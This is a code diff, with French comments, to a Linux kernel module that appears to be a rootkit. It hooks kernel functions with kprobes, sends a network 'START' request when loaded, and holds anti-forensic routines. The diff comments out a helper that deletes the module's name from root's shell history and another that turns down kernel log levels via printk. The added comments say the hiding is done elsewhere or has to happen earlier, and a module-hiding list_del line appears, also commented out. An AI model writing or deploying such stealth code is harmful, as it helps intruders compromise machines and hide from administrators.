@@ -178,24 +178,24 @@ static int handler_pre3(struct kprobe *p, struct pt_regs *regs) {
 	return 0;
 }
 
-// Fonction pour clear les logs 
-static void clear_history_logs(void) {
-	char cmd[] = "sed -i '/cameleon_ultimate/d' /root/.ash_history";
-	char *argv[] = {"/bin/sh", "-c", cmd, NULL};
-	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
-}
+// Fonction pour clear les logs !!! inutile est fait par le script 
+/* static void clear_history_logs(void) { */
+/* 	char cmd[] = "sed -i '/cameleon_ultimate/d' /root/.ash_history"; */
+/* 	char *argv[] = {"/bin/sh", "-c", cmd, NULL}; */
+/* 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC); */
+/* } */
 
-//Desactive les logs kernel compromettants
-static void kernel_logs_desactivation(void) {
-	char cmd2[] = "echo '4 4 4 4' > /proc/sys/kernel/printk";	
-	char *argv2[] = {"/bin/sh", "-c", cmd2, NULL};
-	call_usermodehelper(argv2[0], argv2, NULL, UMH_WAIT_EXEC);
-}
+//Desactive les logs kernel compromettants !! TROP TARD IL FAUT DESACTIVER AVANT L'INSERTION
+/* static void kernel_logs_desactivation(void) { */
+/* 	char cmd2[] = "echo '4 4 4 4' > /proc/sys/kernel/printk";	 */
+/* 	char *argv2[] = {"/bin/sh", "-c", cmd2, NULL}; */
+/* 	call_usermodehelper(argv2[0], argv2, NULL, UMH_WAIT_EXEC); */
+/* } */
 
 // Init function (called when insmod)
 static int __init hook_init(void) {
 	// desactive les logs kernel compromettants
-	kernel_logs_desactivation();
+	/* kernel_logs_desactivation(); */
 
 	// networking start
 	make_request("START");
@@ -232,7 +232,7 @@ static int __init hook_init(void) {
 	//list_del(&THIS_MODULE->list); 	
 	
 	// clear logs
-	clear_history_logs();
+	/* clear_history_logs(); */
 	return 0;
 }
 
